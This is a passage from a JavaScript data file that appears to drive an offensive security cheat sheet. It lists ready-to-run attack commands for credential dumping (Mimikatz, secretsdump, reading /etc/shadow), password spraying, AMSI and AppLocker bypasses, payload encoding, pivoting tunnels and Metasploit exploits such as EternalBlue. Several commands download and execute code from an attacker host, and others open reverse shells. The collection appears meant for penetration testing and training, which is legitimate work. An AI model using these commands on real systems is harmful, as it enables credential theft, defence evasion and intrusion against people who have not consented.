          { title: "Mimikatz SAM Dump", desc: "Dump SAM database hashes", cmd: "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"", tags: ["essential", "tool"] },
          { title: "Mimikatz DCSync", desc: "Replicate AD to extract all hashes", cmd: "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /all\" \"exit\"", tags: ["essential", "tool"] },
          { title: "Mimikatz DCSync Specific User", desc: "DCSync a specific user's hash", cmd: "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /user:Administrator\" \"exit\"", tags: ["essential", "tool"] },
          { title: "Mimikatz Pass the Hash", desc: "Perform Pass-the-Hash attack", cmd: "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH>\" \"exit\"", tags: ["essential", "tool"] },
          { title: "Mimikatz Kerberos Tickets", desc: "Export Kerberos tickets from memory", cmd: "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"", tags: ["tool"] },
          { title: "Mimikatz Golden Ticket", desc: "Create a Golden Ticket", cmd: "mimikatz.exe \"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt\" \"exit\"", tags: ["advanced", "tool"] },
          { title: "Mimikatz DPAPI Vault", desc: "Decrypt DPAPI-protected credentials", cmd: "mimikatz.exe \"privilege::debug\" \"vault::cred\" \"exit\"", tags: ["advanced", "tool"] },
          { title: "Secretsdump Remote", desc: "Dump secrets from remote host (Impacket)", cmd: "secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>", tags: ["essential", "tool"] },
          { title: "Secretsdump with Hash", desc: "Dump secrets using NTLM hash (PtH)", cmd: "secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>", tags: ["essential", "tool"] },
          { title: "Secretsdump Local SAM", desc: "Extract hashes from local SAM/SYSTEM files", cmd: "secretsdump.py -sam SAM -system SYSTEM LOCAL", tags: ["essential", "tool"] },
          { title: "Pypykatz Live Dump", desc: "Python mimikatz — dump from live LSASS", cmd: "pypykatz live lsa", tags: ["tool"] },
          { title: "Pypykatz from Dump", desc: "Parse LSASS dump file", cmd: "pypykatz lsa minidump lsass.dmp", tags: ["tool"] },
          { title: "LaZagne All Modules", desc: "Extract credentials from various applications", cmd: "lazagne.exe all", tags: ["tool"] },
        ]
      },
      {
        name: "Credential Dumping (Linux)",
        commands: [
          { title: "Shadow File Extract", desc: "Read password hashes from shadow file", cmd: "cat /etc/shadow", tags: ["essential"], note: "Requires root or shadow group" },
          { title: "Unshadow for John", desc: "Combine passwd and shadow for cracking", cmd: "unshadow /etc/passwd /etc/shadow > unshadowed.txt", tags: ["essential"] },
          { title: "LaZagne Linux", desc: "Extract stored credentials on Linux", cmd: "python3 lazagne.py all", tags: ["tool"] },
          { title: "Search for Password Files", desc: "Find files containing passwords", cmd: "grep -rli 'password\\|passwd\\|pass\\|pwd' /etc/ /opt/ /var/ /home/ 2>/dev/null", tags: ["essential"] },
          { title: "Check SSH Keys", desc: "Find readable SSH private keys", cmd: "find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | xargs ls -la", tags: ["essential"] },
          { title: "Check Cached Credentials", desc: "Look for cached/stored credentials", cmds: ["cat ~/.bashrc | grep -i pass", "cat ~/.profile | grep -i pass", "find / -name '*.config' -exec grep -li 'password' {} \\; 2>/dev/null"], tags: ["essential"] },
        ]
      },
      {
        name: "Password Spraying",
        commands: [
          { title: "CrackMapExec Password Spray SMB", desc: "Spray password across SMB accounts", cmd: "crackmapexec smb <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success", tags: ["essential", "tool"] },
          { title: "CrackMapExec Spray Multiple Passwords", desc: "Spray multiple passwords against users", cmd: "crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success --no-bruteforce", tags: ["tool"] },
          { title: "Kerbrute User Enumeration", desc: "Enumerate valid AD users via Kerberos", cmd: "kerbrute userenum -d <DOMAIN> --dc <TARGET_IP> users.txt", tags: ["essential", "tool"] },
          { title: "Kerbrute Password Spray", desc: "Spray a password via Kerberos pre-auth", cmd: "kerbrute passwordspray -d <DOMAIN> --dc <TARGET_IP> users.txt '<PASS>'", tags: ["essential", "tool"] },
          { title: "Spray with Hydra", desc: "Password spray via Hydra with single password", cmd: "hydra -L users.txt -p '<PASS>' <TARGET_IP> smb -t 1", tags: ["tool"] },
        ]
      },
      {
        name: "Wordlist Engineering",
        commands: [
          { title: "CeWL Wordlist Generation", desc: "Generate wordlist by spidering target website", cmd: "cewl http://<TARGET_IP> -d 3 -m 5 -w cewl_wordlist.txt", tags: ["essential", "tool"] },
          { title: "CeWL with Emails", desc: "Generate wordlist and extract email addresses", cmd: "cewl http://<TARGET_IP> -d 3 -m 5 -w cewl_wordlist.txt -e --email_file emails.txt", tags: ["tool"] },
          { title: "Crunch Wordlist Generator", desc: "Generate custom wordlist with pattern", cmd: "crunch 8 8 -t @@@@%%%% -o wordlist.txt", tags: ["tool"], note: "@=lower %%=digit ^=special ,=upper" },
          { title: "Crunch with Charset", desc: "Generate wordlist with custom character set", cmd: "crunch 6 8 abcdef123456 -o wordlist.txt", tags: ["tool"] },
          { title: "CUPP Interactive Profiling", desc: "Generate targeted wordlist from personal info", cmd: "cupp -i", tags: ["tool"] },
          { title: "Username Anarchy", desc: "Generate username permutations from names", cmd: "username-anarchy --input-file names.txt --select-format first,flast,first.last > usernames.txt", tags: ["tool"] },
          { title: "Kwprocessor Keyboard Walks", desc: "Generate keyboard walk patterns", cmd: "kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > kwp_wordlist.txt", tags: ["advanced", "tool"] },
          { title: "Mentalist GUI Wordlist", desc: "GUI-based wordlist generator with rules", cmd: "mentalist", tags: ["tool"], note: "GUI tool for creating complex wordlist generation chains" },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 11. Defense Evasion & AV Bypass
  // ─────────────────────────────────────────────
  {
    id: "av-bypass",
    name: "Defense Evasion & AV Bypass",
    icon: "🛡️",
    description: "Bypass antivirus, AMSI, AppLocker, Constrained Language Mode, and other security controls to execute payloads undetected.",
    subcategories: [
      {
        name: "Encoding & Packing",
        commands: [
          { title: "Msfvenom Shikata Encoding", desc: "Encode payload with shikata_ga_nai", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe", tags: ["tool"] },
          { title: "Msfvenom Multi-Encoder", desc: "Chain multiple encoders", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -e x86/alpha_upper -i 3 -f exe -o multi_encoded.exe", tags: ["advanced", "tool"] },
          { title: "UPX Packing", desc: "Pack executable with UPX to change signature", cmd: "upx --best -o packed.exe original.exe", tags: ["tool"] },
          { title: "Veil-Evasion Framework", desc: "Generate AV-evasive payloads with Veil", cmd: "veil", tags: ["tool"], note: "Interactive tool — select payload type and configure options" },
          { title: "Shellter Injection", desc: "Inject payload into legitimate PE executable", cmd: "shellter", tags: ["tool"], note: "Interactive — choose Auto mode, select target PE, configure payload" },
          { title: "Donut Shellcode from PE/DLL", desc: "Convert PE/.NET/DLL to position-independent shellcode", cmd: "donut -i payload.exe -o loader.bin", tags: ["advanced", "tool"] },
          { title: "Donut with Parameters", desc: "Donut shellcode with custom class/method", cmd: "donut -i payload.exe -o loader.bin -e 3 -b 1", tags: ["advanced", "tool"] },
        ]
      },
      {
        name: "AMSI Bypass",
        commands: [
          { title: "AMSI Bypass (Reflection)", desc: "Disable AMSI via reflection in PowerShell", cmd: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", tags: ["essential"] },
          { title: "AMSI Bypass (Patching)", desc: "Patch AMSI in memory", cmd: "$a=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$f=$a.GetField('amsi'+'Init'+'Failed','NonPublic,Static');$f.SetValue($null,$true)", tags: ["essential"], note: "Obfuscated to avoid string detection" },
          { title: "AMSI Bypass (Matt Graeber)", desc: "Force AMSI initialization failure", cmd: "[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x5)", tags: ["advanced"] },
          { title: "AMSI Bypass (PowerShell Downgrade)", desc: "Use PowerShell v2 which has no AMSI", cmd: "powershell -version 2", tags: ["essential"], note: "Only works if .NET 2.0 is still installed" },
          { title: "AMSI Bypass (Base64 Concatenation)", desc: "Split and concatenate AMSI bypass to evade detection", cmd: "$a='System.Management.Automation.A';$b='msi';$u='Utils';$t=[Ref].Assembly.GetType($a+$b+$u);$f=$t.GetField('a'+$b+'InitFailed','NonPublic,Static');$f.SetValue($null,$true)", tags: ["essential"] },
        ]
      },
      {
        name: "PowerShell Evasion",
        commands: [
          { title: "Bypass Execution Policy (Bypass)", desc: "Run script bypassing execution policy", cmd: "powershell -ep bypass -File script.ps1", tags: ["essential"] },
          { title: "Bypass Execution Policy (Unrestricted)", desc: "Set unrestricted execution policy", cmd: "powershell -ExecutionPolicy Unrestricted -File script.ps1", tags: ["essential"] },
          { title: "Bypass via Pipe", desc: "Bypass execution policy by piping script", cmd: "Get-Content script.ps1 | powershell -nop -", tags: ["essential"] },
          { title: "Bypass via Encoded Command", desc: "Execute base64-encoded PowerShell command", cmd: "powershell -nop -enc <BASE64_COMMAND>", tags: ["essential"] },
          { title: "Bypass via Download Cradle (IEX)", desc: "Download and execute script in memory", cmd: "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')\"", tags: ["essential"] },
          { title: "Bypass via Download Cradle (IWR)", desc: "Download and invoke using Invoke-WebRequest", cmd: "powershell -nop -c \"IEX(IWR 'http://<LHOST>/script.ps1' -UseBasicParsing)\"", tags: ["essential"] },
          { title: "Invoke-Obfuscation", desc: "Obfuscate PowerShell scripts to evade detection", cmd: "Import-Module ./Invoke-Obfuscation.psd1; Invoke-Obfuscation", tags: ["advanced", "tool"], note: "Interactive menu — choose TOKEN, STRING, or ENCODING obfuscation" },
          { title: "PowerShell Constrained Language Check", desc: "Check if CLM is enabled", cmd: "$ExecutionContext.SessionState.LanguageMode", tags: ["essential"] },
        ]
      },
      {
        name: "AppLocker & CLM Bypass",
        commands: [
          { title: "AppLocker Policy Check", desc: "View current AppLocker policy", cmd: "Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections", tags: ["essential"] },
          { title: "MSBuild AppLocker Bypass", desc: "Execute C# code via MSBuild (whitelisted)", cmd: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj", tags: ["essential"], note: "Create .csproj file with embedded C# shellcode runner" },
          { title: "InstallUtil AppLocker Bypass", desc: "Execute .NET assembly via InstallUtil", cmd: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe", tags: ["essential"] },
          { title: "Regsvcs AppLocker Bypass", desc: "Execute .NET assembly via regsvcs", cmd: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe payload.dll", tags: ["advanced"] },
          { title: "Regasm AppLocker Bypass", desc: "Execute .NET assembly via regasm", cmd: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U payload.dll", tags: ["advanced"] },
          { title: "CLM Bypass via PSBypassCLM", desc: "Bypass Constrained Language Mode with custom runspace", cmd: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U PSBypassCLM.exe", tags: ["advanced", "tool"] },
        ]
      },
      {
        name: "Binary Obfuscation",
        commands: [
          { title: "Certutil Download", desc: "Download files using Windows certutil", cmd: "certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\temp\\shell.exe", tags: ["essential"] },
          { title: "Certutil Base64 Decode", desc: "Decode base64-encoded payload with certutil", cmd: "certutil -decode encoded.b64 payload.exe", tags: ["essential"] },
          { title: "MSHTA Execution", desc: "Execute HTA payload via mshta", cmd: "mshta http://<LHOST>/shell.hta", tags: ["essential"] },
          { title: "MSHTA Inline VBScript", desc: "Execute inline VBScript via mshta", cmd: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"\", 0:close\")", tags: ["advanced"] },
          { title: "Rundll32 Execution", desc: "Execute DLL payload via rundll32", cmd: "rundll32.exe shell.dll,EntryPoint", tags: ["essential"] },
          { title: "Wscript Execution", desc: "Execute script via Windows Script Host", cmd: "wscript /e:vbscript C:\\temp\\payload.txt", tags: ["essential"] },
          { title: "Cscript Execution", desc: "Execute script via cscript", cmd: "cscript //nologo C:\\temp\\payload.vbs", tags: ["essential"] },
          { title: "Chameleon Python Obfuscator", desc: "Obfuscate Python scripts for AV evasion", cmd: "python3 chameleon.py -f payload.py -o obfuscated.py", tags: ["advanced", "tool"] },
          { title: "Nimcrypt2 PE Packer", desc: "Pack and encrypt PE with Nim loader", cmd: "nimcrypt2 -f shell.exe -t csharp -o packed.exe", tags: ["advanced", "tool"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 12. Network Pivoting & Traffic Routing
  // ─────────────────────────────────────────────
  {
    id: "pivoting",
    name: "Network Pivoting & Traffic Routing",
    icon: "🔀",
    description: "Route traffic through compromised hosts to reach internal networks using SSH tunnels, SOCKS proxies, and specialized pivoting tools.",
    subcategories: [
      {
        name: "SSH Forwarding",
        commands: [
          { title: "SSH Local Port Forward", desc: "Forward local port to remote service through SSH", cmd: "ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>", tags: ["essential"], note: "Access remote service at localhost:<LOCAL_PORT>" },
          { title: "SSH Remote Port Forward", desc: "Expose attacker service to internal network", cmd: "ssh -R <PIVOT_PORT>:<ATTACKER_IP>:<ATTACKER_PORT> <USER>@<PIVOT_IP>", tags: ["essential"] },
          { title: "SSH Dynamic SOCKS Proxy", desc: "Create SOCKS proxy through SSH tunnel", cmd: "ssh -D 1080 <USER>@<PIVOT_IP>", tags: ["essential"], note: "Configure proxychains to use socks5 127.0.0.1 1080" },
          { title: "SSH Jump Host", desc: "SSH through a jump host to reach final target", cmd: "ssh -J <USER>@<PIVOT_IP> <USER>@<TARGET_IP>", tags: ["essential"] },
          { title: "SSH Local Forward (Background)", desc: "Run SSH tunnel in background", cmd: "ssh -f -N -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>", tags: ["essential"] },
          { title: "SSH Dynamic SOCKS (Background)", desc: "Background SOCKS proxy", cmd: "ssh -f -N -D 1080 <USER>@<PIVOT_IP>", tags: ["essential"] },
          { title: "SSHuttle VPN-like Tunnel", desc: "Route traffic through SSH like a VPN", cmd: "sshuttle -r <USER>@<PIVOT_IP> <INTERNAL_SUBNET>/24", tags: ["essential", "tool"] },
          { title: "SSHuttle Exclude Subnet", desc: "Route with excluded networks", cmd: "sshuttle -r <USER>@<PIVOT_IP> <INTERNAL_SUBNET>/24 -x <PIVOT_IP>/32", tags: ["tool"] },
          { title: "SSH with Key and Forward", desc: "SSH tunnel using key authentication", cmd: "ssh -i id_rsa -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP> -fN", tags: ["essential"] },
        ]
      },
      {
        name: "Chisel Tunnels",
        commands: [
          { title: "Chisel Server (Attacker)", desc: "Start chisel server on attacker machine", cmd: "chisel server --reverse --port 8080", tags: ["essential", "tool"] },
          { title: "Chisel SOCKS Proxy (Client)", desc: "Create reverse SOCKS proxy from target", cmd: "./chisel client <ATTACKER_IP>:8080 R:socks", tags: ["essential", "tool"], note: "Creates SOCKS5 proxy on attacker at 127.0.0.1:1080" },
          { title: "Chisel Reverse Port Forward", desc: "Forward specific port back to attacker", cmd: "./chisel client <ATTACKER_IP>:8080 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>", tags: ["essential", "tool"] },
          { title: "Chisel Forward Port", desc: "Forward local port to remote service", cmd: "./chisel client <ATTACKER_IP>:8080 <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>", tags: ["tool"] },
          { title: "Chisel Multiple Tunnels", desc: "Create multiple tunnels in single connection", cmd: "./chisel client <ATTACKER_IP>:8080 R:socks R:8888:<TARGET_IP>:80 R:4444:<TARGET_IP>:445", tags: ["advanced", "tool"] },
        ]
      },
      {
        name: "Ligolo-ng",
        commands: [
          { title: "Ligolo-ng Create TUN Interface", desc: "Create TUN interface on attacker (Linux)", cmds: ["sudo ip tuntap add user $(whoami) mode tun ligolo", "sudo ip link set ligolo up"], tags: ["essential", "tool"] },
          { title: "Ligolo-ng Start Proxy", desc: "Start ligolo-ng proxy on attacker", cmd: "sudo ./proxy -selfcert -laddr 0.0.0.0:11601", tags: ["essential", "tool"] },
          { title: "Ligolo-ng Agent Connect", desc: "Run agent on compromised host to connect back", cmd: "./agent -connect <ATTACKER_IP>:11601 -ignore-cert", tags: ["essential", "tool"] },
          { title: "Ligolo-ng Add Route", desc: "Add route to access internal network", cmd: "sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo", tags: ["essential", "tool"] },
          { title: "Ligolo-ng Start Tunnel", desc: "Start the tunnel from ligolo proxy console", cmds: ["# In ligolo proxy console:", "session", "# Select the agent session", "start"], tags: ["essential", "tool"] },
          { title: "Ligolo-ng Add Listener", desc: "Add a listener on the agent for reverse connections", cmd: "# In ligolo proxy console:\nlistener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT> --tcp", tags: ["advanced", "tool"], note: "Allows catching reverse shells through the tunnel" },
        ]
      },
      {
        name: "SOCKS Proxying",
        commands: [
          { title: "Proxychains Configuration", desc: "Configure proxychains for SOCKS proxy", cmds: ["# Edit /etc/proxychains4.conf:", "# Add at the bottom:", "socks5 127.0.0.1 1080"], tags: ["essential"] },
          { title: "Proxychains Nmap", desc: "Run nmap through SOCKS proxy", cmd: "proxychains -q nmap -sT -Pn -n <TARGET_IP> -p 21,22,80,443,445,3389", tags: ["essential"], note: "Only TCP connect scan (-sT) works through proxychains" },
          { title: "Proxychains Curl", desc: "Access web service through proxy", cmd: "proxychains -q curl http://<TARGET_IP>", tags: ["essential"] },
          { title: "Proxychains Evil-WinRM", desc: "Connect to WinRM through proxy", cmd: "proxychains -q evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'", tags: ["essential"] },
          { title: "Proxychains CrackMapExec", desc: "Run CrackMapExec through proxy", cmd: "proxychains -q crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>'", tags: ["essential"] },
          { title: "Proxychains SMBClient", desc: "Connect to SMB share through proxy", cmd: "proxychains -q smbclient //<TARGET_IP>/<SHARE> -U <USER>%<PASS>", tags: ["essential"] },
          { title: "Proxychains SSH", desc: "SSH through SOCKS proxy", cmd: "proxychains -q ssh <USER>@<TARGET_IP>", tags: ["essential"] },
          { title: "Proxychains RDP", desc: "RDP through SOCKS proxy", cmd: "proxychains -q xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS>", tags: ["tool"] },
        ]
      },
      {
        name: "Windows Port Forwards",
        commands: [
          { title: "Netsh Port Forward Add", desc: "Create port forward using netsh", cmd: "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<LISTEN_PORT> connectaddress=<TARGET_IP> connectport=<TARGET_PORT>", tags: ["essential"] },
          { title: "Netsh Show Port Forwards", desc: "List all active port forwards", cmd: "netsh interface portproxy show all", tags: ["essential"] },
          { title: "Netsh Delete Port Forward", desc: "Remove a port forward rule", cmd: "netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=<LISTEN_PORT>", tags: ["essential"] },
          { title: "Netsh Firewall Allow Port", desc: "Open firewall port for the forward", cmd: "netsh advfirewall firewall add rule name=\"Forward\" dir=in action=allow protocol=tcp localport=<LISTEN_PORT>", tags: ["essential"] },
          { title: "Plink Local Forward", desc: "PuTTY plink for SSH local port forward", cmd: "plink.exe -ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>", tags: ["essential", "tool"] },
          { title: "Plink Remote Forward", desc: "PuTTY plink for SSH remote port forward", cmd: "plink.exe -ssh -R <ATTACKER_PORT>:127.0.0.1:<LOCAL_PORT> <USER>@<ATTACKER_IP>", tags: ["essential", "tool"] },
          { title: "Plink Dynamic SOCKS", desc: "PuTTY plink for dynamic SOCKS proxy", cmd: "plink.exe -ssh -D 1080 <USER>@<ATTACKER_IP>", tags: ["tool"] },
        ]
      },
      {
        name: "Other Tunneling Tools",
        commands: [
          { title: "Socat Port Forward", desc: "Forward port using socat", cmd: "socat TCP-LISTEN:<LISTEN_PORT>,fork TCP:<TARGET_IP>:<TARGET_PORT>", tags: ["essential"] },
          { title: "Socat Port Forward (Background)", desc: "Background socat forwarder", cmd: "socat TCP-LISTEN:<LISTEN_PORT>,fork TCP:<TARGET_IP>:<TARGET_PORT> &", tags: ["essential"] },
          { title: "Netcat Relay (mkfifo)", desc: "Create netcat relay for port forwarding", cmd: "mkfifo /tmp/relay; nc -lvnp <LISTEN_PORT> < /tmp/relay | nc <TARGET_IP> <TARGET_PORT> > /tmp/relay", tags: ["essential"] },
          { title: "Rpivot Server (Attacker)", desc: "Start rpivot SOCKS server on attacker", cmd: "python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080", tags: ["tool"] },
          { title: "Rpivot Client (Target)", desc: "Connect rpivot client to attacker server", cmd: "python client.py --server-ip <ATTACKER_IP> --server-port 9999", tags: ["tool"] },
          { title: "Dnscat2 Server", desc: "Start DNS tunnel server", cmd: "ruby dnscat2.rb <DOMAIN>", tags: ["advanced", "tool"] },
          { title: "Dnscat2 Client", desc: "Connect via DNS tunnel from target", cmd: "dnscat2 <DOMAIN>", tags: ["advanced", "tool"] },
          { title: "Iodine DNS Tunnel Server", desc: "Create IP-over-DNS tunnel server", cmd: "iodined -f -c -P <PASS> 10.0.0.1 <TUNNEL_DOMAIN>", tags: ["advanced", "tool"] },
          { title: "Iodine DNS Tunnel Client", desc: "Connect to IP-over-DNS tunnel", cmd: "iodine -f -P <PASS> <TUNNEL_DOMAIN>", tags: ["advanced", "tool"] },
          { title: "ICMP Shell (icmpsh)", desc: "Start ICMP-based reverse shell listener", cmds: ["# Attacker:", "python icmpsh_m.py <ATTACKER_IP> <TARGET_IP>", "# Target (Windows):", "icmpsh.exe -t <ATTACKER_IP>"], tags: ["advanced", "tool"] },
          { title: "Neo-reGeorg Tunnel", desc: "Web-based tunnel via uploaded web shell", cmds: ["# Generate tunnel webshell:", "python neoreg.py generate -k <PASSWORD>", "# Upload tunnel.php/aspx/jsp to target, then:", "python neoreg.py -k <PASSWORD> -u http://<TARGET_IP>/tunnel.php"], tags: ["advanced", "tool"] },
          { title: "Invoke-SocksProxy (PowerShell)", desc: "Create SOCKS proxy on Windows via PowerShell", cmd: "Import-Module .\\Invoke-SocksProxy.psm1; Invoke-SocksProxy -bindPort 1080", tags: ["advanced", "tool"] },
          { title: "FPipe Port Forward (Windows)", desc: "Port forwarding tool for Windows", cmd: "fpipe.exe -l <LISTEN_PORT> -r <TARGET_PORT> <TARGET_IP>", tags: ["tool"] },
        ]
      }
    ]
  },

  // ─── 13. Metasploit Operations ───
  {
    id: "metasploit",
    name: "Metasploit Operations",
    icon: "🔧",
    description: "Metasploit Framework for exploitation, post-exploitation, and pivoting",
    subcategories: [
      {
        name: "Framework Setup & Navigation",
        commands: [
          { title: "Initialize Metasploit Database", cmd: "sudo msfdb init", tags: ["essential"], desc: "Initialize the PostgreSQL database for Metasploit" },
          { title: "Start Metasploit Database", cmd: "sudo msfdb start", tags: ["essential"], desc: "Start the Metasploit database service" },
          { title: "Launch Metasploit Console", cmd: "msfconsole -q", tags: ["essential"], desc: "Start Metasploit Framework console in quiet mode" },
          { title: "Check Database Status", cmd: "db_status", tags: ["essential"], desc: "Verify database connectivity inside msfconsole" },
          { title: "Create Workspace", cmd: "workspace -a <PROJECT_NAME>", tags: ["essential"], desc: "Create a new workspace to organize engagements" },
          { title: "List Workspaces", cmd: "workspace", tags: ["essential"], desc: "List all available workspaces" },
          { title: "Switch Workspace", cmd: "workspace <PROJECT_NAME>", tags: ["essential"], desc: "Switch to a specific workspace" },
          { title: "Delete Workspace", cmd: "workspace -d <PROJECT_NAME>", tags: ["tool"], desc: "Delete a workspace and its associated data" },
          { title: "Search for Modules", cmd: "search type:exploit platform:windows <KEYWORD>", tags: ["essential"], desc: "Search for exploit modules by keyword and platform" },
          { title: "Search CVE", cmd: "search cve:<CVE_YEAR>-<CVE_ID>", tags: ["essential"], desc: "Search modules by CVE identifier" },
          { title: "Use a Module", cmd: "use exploit/windows/smb/ms17_010_eternalblue", tags: ["essential"], desc: "Select a module to configure and run" },
          { title: "Show Module Info", cmd: "info", tags: ["essential"], desc: "Display detailed information about the selected module" },
          { title: "Show Module Options", cmd: "show options", tags: ["essential"], desc: "Display configurable options for the current module" },
          { title: "Show Available Payloads", cmd: "show payloads", tags: ["essential"], desc: "List compatible payloads for the current exploit" },
          { title: "Show Targets", cmd: "show targets", tags: ["tool"], desc: "List available target configurations for the exploit" },
          { title: "Set Module Option", cmd: "set RHOSTS <TARGET_IP>", tags: ["essential"], desc: "Set a module-specific option" },
          { title: "Set Global Option", cmd: "setg RHOSTS <TARGET_IP>", tags: ["tool"], desc: "Set a global option persisting across modules" },
          { title: "Import Nmap Scan", cmd: "db_nmap -sV -O <TARGET_IP>", tags: ["tool"], desc: "Run nmap and import results directly into the database" },
          { title: "Import External Scan", cmd: "db_import /path/to/scan.xml", tags: ["tool"], desc: "Import nmap/Nessus/etc. XML results into the workspace" },
          { title: "List Discovered Hosts", cmd: "hosts", tags: ["tool"], desc: "Show all hosts stored in the current workspace database" },
          { title: "List Discovered Services", cmd: "services", tags: ["tool"], desc: "Show all services found in the current workspace" },
          { title: "List Stored Credentials", cmd: "creds", tags: ["tool"], desc: "Show all credentials gathered in the workspace" },
          { title: "List Loot", cmd: "loot", tags: ["tool"], desc: "Show all loot (files, hashes) collected in the workspace" }
        ]
      },
      {
        name: "Exploitation Modules",
        commands: [
          { title: "EternalBlue (MS17-010)", cmds: ["use exploit/windows/smb/ms17_010_eternalblue", "set RHOSTS <TARGET_IP>", "set LHOST <ATTACKER_IP>", "set payload windows/x64/meterpreter/reverse_tcp", "exploit"], tags: ["essential"], desc: "Exploit MS17-010 SMB vulnerability for remote code execution" },
          { title: "PsExec Module", cmds: ["use exploit/windows/smb/psexec", "set RHOSTS <TARGET_IP>", "set SMBUser <USER>", "set SMBPass <PASS>", "set payload windows/meterpreter/reverse_tcp", "set LHOST <ATTACKER_IP>", "exploit"], tags: ["essential"], desc: "Authenticate and execute payload via SMB PsExec" },
          { title: "Web Delivery (PowerShell)", cmds: ["use exploit/multi/script/web_delivery", "set target 2", "set payload windows/meterpreter/reverse_tcp", "set LHOST <ATTACKER_IP>", "set LPORT <PORT>", "exploit -j"], tags: ["essential"], desc: "Host a payload for download and execution via PowerShell one-liner" },
          { title: "Web Delivery (Python)", cmds: ["use exploit/multi/script/web_delivery", "set target 0", "set payload python/meterpreter/reverse_tcp", "set LHOST <ATTACKER_IP>", "set LPORT <PORT>", "exploit -j"], tags: ["tool"], desc: "Host a payload for download and execution via Python one-liner" },
          { title: "Java RMI Server", cmds: ["use exploit/multi/misc/java_rmi_server", "set RHOSTS <TARGET_IP>", "set payload java/meterpreter/reverse_tcp", "set LHOST <ATTACKER_IP>", "exploit"], tags: ["tool"], desc: "Exploit Java RMI registry for code execution" },
          { title: "Tomcat Manager Upload", cmds: ["use exploit/multi/http/tomcat_mgr_upload", "set RHOSTS <TARGET_IP>", "set RPORT 8080", "set HttpUsername <USER>", "set HttpPassword <PASS>", "set payload java/meterpreter/reverse_tcp", "set LHOST <ATTACKER_IP>", "exploit"], tags: ["essential"], desc: "Deploy a WAR payload through Tomcat Manager" },
          { title: "Multi/Handler Listener", cmds: ["use exploit/multi/handler", "set payload windows/x64/meterpreter/reverse_tcp", "set LHOST <ATTACKER_IP>", "set LPORT <PORT>", "exploit -j"], tags: ["essential"], desc: "Start a background listener for incoming reverse shells" },
          { title: "Multi/Handler (Linux)", cmds: ["use exploit/multi/handler", "set payload linux/x64/meterpreter/reverse_tcp", "set LHOST <ATTACKER_IP>", "set LPORT <PORT>", "exploit -j"], tags: ["essential"], desc: "Start a background listener for Linux reverse meterpreter" },
          { title: "Run Exploit as Background Job", cmd: "exploit -j", tags: ["essential"], desc: "Launch the current exploit as a background job" },
          { title: "HTA Server Delivery", cmds: ["use exploit/windows/misc/hta_server", "set SRVHOST <ATTACKER_IP>", "set payload windows/meterpreter/reverse_tcp", "set LHOST <ATTACKER_IP>", "exploit -j"], tags: ["tool"], desc: "Serve an HTA payload for client-side exploitation" },
          { title: "MS08-067 NetAPI", cmds: ["use exploit/windows/smb/ms08_067_netapi", "set RHOSTS <TARGET_IP>", "set LHOST <ATTACKER_IP>", "exploit"], tags: ["tool"], desc: "Exploit the classic MS08-067 Windows vulnerability" },
